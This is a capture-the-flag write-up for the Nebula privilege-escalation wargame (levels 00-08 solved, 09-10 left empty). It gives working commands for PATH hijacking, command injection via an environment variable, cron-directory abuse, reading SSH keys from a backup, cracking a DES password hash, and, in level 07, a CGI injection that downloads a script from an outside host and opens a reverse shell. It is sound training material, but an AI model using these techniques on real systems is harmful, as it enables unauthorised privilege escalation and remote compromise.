## Exploit Exercise -- Nebula

### Level 00
#### Chall. Description
> This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

#### Solution
To find the file, we can use `find` command. Specify `-perm -4000` for SUID and `-user flag00` for the user `flag00`. And since we are going to search from `/`, there will be a lot of "Permission denied" error, we can redirect the stderr to `/dev/null` for the cleanness of the output. 
```bash
level00@nebula:~$ find / -perm -4000 -user flag00 2>/dev/null
/bin/.../flag00
/rofs/bin/.../flag00
```
Both of the binary will do. We can run either of them and run `getflag` to get the flag.
```bash
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ whoami
flag00
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Level 01
#### Chall. Description
> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
> Files for this level can be found in /home/flag01.
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

#### Solution
The binary will get the effective UID and GID, then set it as the real, effective and saved set-user-ID UID. Since the binary has SUID set, the effective UID while running this binary will be the target user `flag01`.
```bash
level01@nebula:~$ ls -l /home/flag01/flag01
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 /home/flag01/flag01
```
`system()` function executes the command `echo` without specifying the absoulte path, so we can do PATH hijacking here.

First, we create a file named `echo`, which will actually give us a bash shell, and make it executable.
```bash
level01@nebula:~$ cat << EOF > echo
> #!/bin/bash
> /bin/bash -ip
> EOF
level01@nebula:~$ chmod +x echo
```
Then we can hijack the `PATH` environment variable and get the shell of the user `flag01`.
```bash
level01@nebula:~$ PATH=/home/level01:$PATH /home/flag01/flag01
flag01@nebula:~$ whoami
flag01
flag01@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Level 02
#### Chall. Description
> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
> Files for this level can be found in /home/flag02.
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

#### Solution
The upper part of the code is the same as the previous level, so the binary is run as the `flag02` user.
The functionality of `asprintf` is as follow:
> The functions `asprintf()` and `vasprintf()` are analogs of `sprintf(3)` and `vsprintf(3)`, except that they allocate a string large enough to hold the output including the terminating null byte ('\0'), and return a pointer to it via the first argument.
The content of the `USER` environment variable is put into the string, then executes by `system()`. So we can do some command injection here.
Use `;` to end the `echo` command, spawn the bash shell, then use `#` to comment out the trailing useless string.
```bash
level02@nebula:~$ USER=';/bin/bash #' /home/flag02/flag02
about to call system("/bin/echo ;/bin/bash # is cool")

flag02@nebula:~$ whoami
flag02
flag02@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Level 03
#### Chall. Description
> Check the home directory of flag03 and take note of the files there.
> There is a crontab that is called every couple of minutes.
> Files for this level can be found in /home/flag03.

#### Solution
The files under `/home/flag03`:
```bash
level03@nebula:~$ ls -lR /home/flag03
/home/flag03:
total 1
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh

/home/flag03/writable.d:
total 0
```
The content of `writable.sh`
```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
`writable.sh` will execute every file in `writable.d/` for at most 5 second (see `man bash` for `ulimit` functionality). Since `writable.d/` is wriable and `writable.sh` is executed every couple of minutes by the crontab, we can put a script in `writable.d/` to get the flag.
```bash
level03@nebula:~$ cat << EOF > /home/flag03/writable.d/give_me_flag
> #!/bin/bash
> getflag > /tmp/theflag
> EOF
level03@nebula:~$ chmod +x /home/flag03/writable.d/give_me_flag
level03@nebula:~$ ls /tmp
theflag
level03@nebula:~$ cat /tmp/theflag
You have successfully executed getflag on a target account
```


### Level 04
#### Chall. Description
> This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
> Files for this level can be found in /home/flag04.
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

#### Solution
We cannot directly specify `token` as the file to read, so we use a link of `token` file without `token` in the link name to read it.
```bash
level04@nebula:~$ ln /home/flag04/token my_skip
level04@nebula:~$ /home/flag04/flag04 my_skip
06508b5e-8909-4f38-b630-fdb148a848a2
```

### Level 05
#### Chall. Description
> Check the flag05 home directory. You are looking for weak directory permissions
> Files for this level can be found in /home/flag05.

#### Solution
The file under `/home/flag05`:
```bash
level05@nebula:~$ ls -alR /home/flag05
/home/flag05:
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     220 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh

/home/flag05/.backup:
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
ls: cannot open directory /home/flag05/.ssh: Permission denied
```
Decompress `backup-19072011.tgz` and use the private key to ssh into `flag05` user.
```bash
level05@nebula:~$ tar zxvf /home/flag05/.backup/backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ssh -i .ssh/id_rsa flag05@127.0.0.1
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Level 06
#### Chall. Description
> The flag06 account credentials came from a legacy unix system.
> Files for this level can be found in /home/flag06.

#### Solution
Unix system used to store the password hash in `/etc/passwd`.
```bash
level06@nebula:~$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```
We can use `john` to decrypt the hash, which is DES encrypted identified by `hashid`.
```bash
ice1187@ctf$ hashid  level06.pwd
--File 'level06.pwd'--
Analyzing 'ueqwOCnSGdsuM'
[+] DES(Unix) [JtR Format: descrypt]
[+] Traditional DES [JtR Format: descrypt]
[+] DEScrypt [JtR Format: descrypt]
--End of file 'level06.pwd'--
ice1187@ctf$ john --format=descrypt level06.pwd
hello            (flag06)
```
Then we can use the decrypted password `hello` to login as `flag06`.
```bash
level06@nebula:~$ su flag06
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

### Level 07
#### Chall. Description
> The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
> Files for this level can be found in /home/flag07.
```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

#### Solution
From `Host`, we can do command injection.
```bash
ice1187@ctf$ curl '192.168.10.4:7007/index.cgi?Host=$(whoami)'
<html><head><title>Ping results</title></head><body><pre>ping: unknown host flag07
</pre></body></html>%
```
We can get a reverse shell by uploading and executing the script.
```
ice1187@ctf$ python3 level07.py
> wget 192.168.10.1:8000/rev.sh
l><head><title>Ping results</title></head><body><pre>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination

> /bin/bash rev.sh
```
```bash
ice1187@ctf:~$ nc -lvnp 13337
Listening on 0.0.0.0 13337
Connection received on 192.168.10.4 48200
bash: no job control in this shell
flag07@nebula:/home/flag07$ whoami
whoami
flag07
flag07@nebula:/home/flag07$ getflag
getflag
You have successfully executed getflag on a target account
```

### Level 08
#### Chall. Description
> World readable files strike again. Check what that user was up to, and use it to log into flag08 account.
> Files for this level can be found in /home/flag08.

#### Solution
There is a PCAP file in the `flag08`'s home. Open it in Wireshark, follow the TCP stream, and decode the data as UTF-8, then we can see the password is `backdoor00Rm8ate`.
```
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

wwwbugs login: lleevveell88

Password: backdoor00Rm8ate
```
```bash
level08@nebula:/home/flag08$ su flag08
Password:
sh-4.2$ whoami
flag08
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

### Level 09
#### Chall. Description
> There’s a C setuid wrapper for some vulnerable PHP code.
> Files for this level can be found in /home/flag09.
```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

#### Solution


### Level 10
#### Chall. Description

#### Solution


